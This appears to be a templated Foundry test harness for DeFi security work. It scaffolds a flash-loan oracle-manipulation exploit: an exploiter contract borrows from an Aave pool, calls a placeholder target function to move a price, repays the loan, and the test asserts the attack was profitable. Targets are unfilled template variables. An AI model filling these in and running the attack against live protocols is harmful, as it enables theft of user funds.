pragma solidity ^{{ solc_version | default("0.8.20") }};

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ITarget {
    function {{ target_function }}({{ target_function_args | default("") }}) external;
}

interface IOracle {
    function latestRoundData() external view returns (
        uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound
    );
}

contract OracleManipulationExploiter {
    IPool public pool;
    ITarget public target;
    IERC20 public token;

    constructor(address _pool, address _target, address _token) {
        pool = IPool(_pool);
        target = ITarget(_target);
        token = IERC20(_token);
    }

    function attack(uint256 amount) external {
        pool.flashLoanSimple(address(this), address(token), amount, "", 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata /* params */
    ) external returns (bool) {
        require(msg.sender == address(pool), "not pool");
        require(initiator == address(this), "not initiator");

        // --- Manipulate oracle via large swap / liquidity change ---
        token.approve(address(target), amount);
        target.{{ target_function }}({{ exploit_args | default("") }});

        // --- Repay ---
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(pool), amountOwed);
        return true;
    }
}

contract OracleManipulationTest is Test {
    OracleManipulationExploiter public exploiter;
    IERC20 public token;
    IOracle public oracle;

    {% if fork_url %}
    uint256 internal fork;
    {% endif %}

    function setUp() public {
        {% if fork_url %}
        fork = vm.createSelectFork(
            "{{ fork_url }}"{% if fork_block %},
            {{ fork_block }}{% endif %}

        );
        {% endif %}

        token = IERC20({{ flash_token | default("address(0)") }});
        oracle = IOracle({{ oracle_address }});
        exploiter = new OracleManipulationExploiter(
            {{ aave_pool | default("0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2") }},
            {{ target_contract }},
            {{ flash_token | default("address(0)") }}
        );

        vm.label(address(exploiter), "Exploiter");
        vm.label({{ target_contract }}, "Target");
        vm.label({{ oracle_address }}, "Oracle");
    }

    function test_oracle_manipulation() public {
        // Read oracle price before manipulation
        (, int256 priceBefore,,,) = oracle.latestRoundData();
        console.log("Price before:");
        console.logInt(priceBefore);

        uint256 balBefore = token.balanceOf(address(exploiter));

        // Execute flash loan + manipulation
        exploiter.attack({{ flash_amount | default("1000000 * 1e18") }});

        uint256 balAfter = token.balanceOf(address(exploiter));

        // Read oracle price after
        (, int256 priceAfter,,,) = oracle.latestRoundData();
        console.log("Price after:");
        console.logInt(priceAfter);

        uint256 profit = balAfter - balBefore;
        console.log("Profit:", profit);
        assertGt(profit, 0, "Oracle manipulation should be profitable");
    }
}
